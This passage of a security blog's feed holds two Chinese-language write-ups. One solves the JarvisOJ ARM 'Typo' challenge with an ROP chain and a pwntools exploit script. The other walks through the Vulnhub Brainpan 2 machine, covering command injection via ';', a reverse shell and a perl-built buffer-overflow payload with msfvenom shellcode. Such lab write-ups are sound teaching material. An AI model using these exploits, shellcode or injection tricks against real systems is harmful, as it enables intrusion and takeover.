    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序看起来是一个很有趣的打字游戏：</p><p><img src="/img/Typo/Typo1.png"></p><p>checksec发现是arm架构的32位程序：</p><p><img src="/img/Typo/Typo2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>再简单的温习一下ARM架构的函数调用：</p><p><img src="/img/Typo/Typo3.png"></p><ul><li><p>R0～R3通常用于传参，剩下的参数从右向左依次入栈，被调用者实现栈平衡，返回值存放在R0中；</p></li><li><p>r15  -&gt;  pc  &#x3D;&gt; 当前程序执行位置；</p></li><li><p>r14  -&gt;  lr  &#x3D;&gt; 连接寄存器：跳转指令自动把返回地址放入r14中；</p></li><li><p>r13  -&gt;  sp  &#x3D;&gt; 栈指针：指向上一帧的栈底；</p></li><li><p>r12  -&gt;  ip  &#x3D;&gt; ip 内部过程调用寄存器Intra-Procedure-call scratch register，其实就是r12；</p></li><li><p>r11  -&gt;  fp  &#x3D;&gt; 当前函数栈帧的栈底,也就是栈基地址FP；</p></li></ul><p>ARM架构的栈布局如下图所示：</p><p><img src="/img/Typo/Typo4.png"></p><p>main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长。图中FP就是栈基址，它指向函数的栈帧起始地址；</p><p>SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序很是规矩，依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量。先压栈的main stack 进入在高地址。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>回到Typo程序本身，在程序中有‘&#x2F;bin&#x2F;sh’字符串：</p><p><img src="/img/Typo/Typo5.png"></p><p>同时看到是sub_10ba8函数调用这个字符串，根据sub_10ba8函数发现这个函数其实就是system函数。在这个函数下面紧接着就是sub_110b4函数可以调用sub_10ba8即system函数。</p><p><img src="/img/Typo/Typo6.png"></p><p>有了system函数和’&#x2F;bin&#x2F;sh’，接下来需要的是找一个gadget控制R0寄存器：</p><p><img src="/img/Typo/Typo7.png"></p><p>根据找到的gadget构造这样的栈结构：</p><p><img src="/img/Typo/Typo8.png"></p><p>这样在程序返回时, 经过ROP Chain就会实现<code>r0 -&gt; “/bin/sh”</code>, <code>r4 -&gt; junk_data</code>, <code>pc = system_addr</code>的效果, 进而执行<code>system(&quot;/bin/sh&quot;)</code>来get shell。</p><p>最后就是寻找溢出点，确定padding的长度。</p><p><img src="/img/Typo/Typo9.png"></p><p>利用cyclic可以计算出padding长度112。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>所以解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># sh = process(&#x27;./typo&#x27;)</span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9888)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110b4)</span><br><span class="line"></span><br><span class="line">sh.sendafter(&#x27;quit&#x27;, &#x27;\n&#x27;)</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/Typo/Typo10.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
    <category term="ARM" scheme="https://coldwave96.github.io/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub - Brainpan 2 の Write-Up</title>
    <link href="https://coldwave96.github.io/2020/12/02/Brainpan2/"/>
    <id>https://coldwave96.github.io/2020/12/02/Brainpan2/</id>
    <published>2020-12-02T06:36:56.000Z</published>
    <updated>2020-12-02T06:36:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>Brainpan</code>系列的第二台，有点小难度，还有点烧脑。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先确定靶机IP：</p><p><img src="/img/Brainpan2/Brainpan1.png"></p><p>扫描开放端口：</p><p><img src="/img/Brainpan2/Brainpan2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>和brainpan一样，9999端口开放了一个相似的程序，10000端口是个静态页面。</p><p>扫描目录，还是有bin目录：</p><p><img src="/img/Brainpan2/Brainpan3.png"></p><p>依然有个<code>brainpan.exe</code>文件，通过<code>file</code>命令发现是<code>jpeg</code>格式的图片：</p><p><img src="/img/Brainpan2/Brainpan4.png"></p><p>改后缀名打开后发现是超级玛丽……</p><p><img src="/img/Brainpan2/Brainpan5.png"></p><p>可是通过隐写或者夹层等多种方式也无法在其中找到任何有用的信息，只能回头去看9999端口的服务。</p><p>通过多次尝试，原来登录口令就是<code>GUEST</code>：</p><p><img src="/img/Brainpan2/Brainpan6.png"></p><p><code>HELP</code>命令查看各个命令内容：</p><p><img src="/img/Brainpan2/Brainpan7.png"></p><p>通过<code>FILES</code>指令列出文件：</p><p><img src="/img/Brainpan2/Brainpan8.png"></p><p>通过<code>VIEW</code>指令在<code>notes.txt</code>中发现是通过<code>popen(“command”, “r”)</code>实现的各种功能，猜测<code>VIEW</code>指令的实现方式是<code>popen(“cat &lt;filename&gt;”, “r”)</code>。</p><p><img src="/img/Brainpan2/Brainpan9.png"></p><p>尝试通过<code>&quot;;&quot;</code>绕过实现任意命令执行：</p><p><img src="/img/Brainpan2/Brainpan10.png"></p><p>执行python反弹shell的命令，获得靶机的shell：</p><p><img src="/img/Brainpan2/Brainpan11.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan12.png"></p><p>最后一个命令看起来比较有趣：</p><p><img src="/img/Brainpan2/Brainpan13.png"></p><p>进入对应文件夹下寻找信息：</p><p><img src="/img/Brainpan2/Brainpan14.png"></p><p>尝试将<code>msg_root</code>下载到本地查看：</p><p><img src="/img/Brainpan2/Brainpan15.png"></p><p>搭建python建议http服务器，访问<code>http://172.16.83.5:7788/msg_root</code>即可下载对应文件。</p><p>将<code>msg_root</code>通过IDA逆向：</p><p><img src="/img/Brainpan2/Brainpan16.png"></p><p><code>get_name</code>函数：</p><p><img src="/img/Brainpan2/Brainpan17.png"></p><p>根据<code>get_name</code>函数，对于<code>username</code>变量，当我们输入的字节数超过<code>0x11字节</code>后，并没有<code>“\x00”</code>这样的结束符，所以输入过长的时候可能造成缓冲区溢出。</p><p>当<code>fp(username, message)</code>;调用<code>save_msg</code>函数的时候便可以通过控制<code>username</code>长度实现覆盖<code>EIP</code>地址，从而跳转到覆盖的位置执行shellcode。</p><p><img src="/img/Brainpan2/Brainpan18.png"></p><p>根据<code>get_name</code>函数的汇编程序，在<code>0x08048729</code>地址可以控制<code>eax</code>寄存器，从而通过下一步的<code>call eax</code>指令实现任意地址跳转。</p><p>所以在<code>0x8048729</code>的位置下个断点：</p><p><img src="/img/Brainpan2/Brainpan19.png"></p><p>可以看到程序正常运行的时候，<code>ebp-4</code>的地址放着<code>save_msg</code>函数的地址，message部分的内容会被放到<code>0x804a008</code>的地址上去：</p><p><img src="/img/Brainpan2/Brainpan20.png"></p><p>所以我们通过<code>username</code>字段反复重复<code>0x804a008</code>这个地址以覆盖<code>eax</code>，然后将shellcode放到message段即可。</p><p>下面还是通过<code>msfvenom</code>模块生成shellcode：</p><p><img src="/img/Brainpan2/Brainpan21.png"></p><p>最后的<code>payload</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>执行了payload之后可以看到获得了root权限:</p><p><img src="/img/Brainpan2/Brainpan22.png"></p><p>进入<code>/root</code>文件夹发现两个文件，打开<code>flag.txt</code>提示没有权限，打开<code>whatif.txt</code>提示我们还不是root权限？WTF？</p><p><img src="/img/Brainpan2/Brainpan23.png"></p><p>那就继续尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan24.png"></p><p>多了一个<code>brainpan-1.8.exe</code>文件，查看文件夹寻找信息：</p><p><img src="/img/Brainpan2/Brainpan25.png"></p><p>先看一下<code>brainpan.7</code>文件是什么内容：</p><p><img src="/img/Brainpan2/Brainpan26.png"></p><p>文件最后给了提示，我们需要更改<code>brainpan.cfg</code>文件内容修改地址和端口：</p><p><img src="/img/Brainpan2/Brainpan27.png"></p><p>然后运行<code>brainpan-1.8.exe</code>，再连接上去通过命令执行反弹shell：</p><p><img src="/img/Brainpan2/Brainpan28.png"></p><p>接收到<code>puck</code>用户的shell：</p><p><img src="/img/Brainpan2/Brainpan29.png"></p><p>进入<code>/home/puck</code>文件夹寻找线索，有个<code>.backup</code>：</p><p><img src="/img/Brainpan2/Brainpan30.png"></p><p>进去看一下发现可能是前一个文件夹的备份：</p><p><img src="/img/Brainpan2/Brainpan31.png"></p><p>看下唯一有区别的<code>.bash_history</code>文件：</p><p><img src="/img/Brainpan2/Brainpan32.png"></p><p>果然，这里看出来了些端倪。原来是<code>root</code>和<code>root(space)</code>两个账号……</p><p>厉害的让人无F*UCK说……</p><p>通过备份里的<code>.ssh</code>可以ssh连接<code>root(space)</code>：</p><p><img src="/img/Brainpan2/Brainpan33.png"></p><p>但是却提示连接失败，猜测是换了ssh端口，看下配置文件：</p><p><img src="/img/Brainpan2/Brainpan34.png"></p><p>果然端口被改到了2222，再次尝试：</p><p><img src="/img/Brainpan2/Brainpan35.png"></p><p>果然是<code>root(space)</code>账号，再次去查看<code>flag.txt</code>：</p><p><img src="/img/Brainpan2/Brainpan36.png"></p><p>城里人真会玩系列：</p><p><img src="/img/Brainpan2/Brainpan37.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Vulnhub&lt;/code&gt;靶机&lt;code&gt;Brainpan&lt;/code&gt;系列的第二台，有点小难度，还有点烧脑。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="Vulnhub" scheme="https://coldwave96.github.io/categories/WriteUPs/Vulnhub/"/>
    
    
    <category term="Reverse" scheme="https://coldwave96.github.io/tags/Reverse/"/>
    
    <category term="Web" scheme="https://coldwave96.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
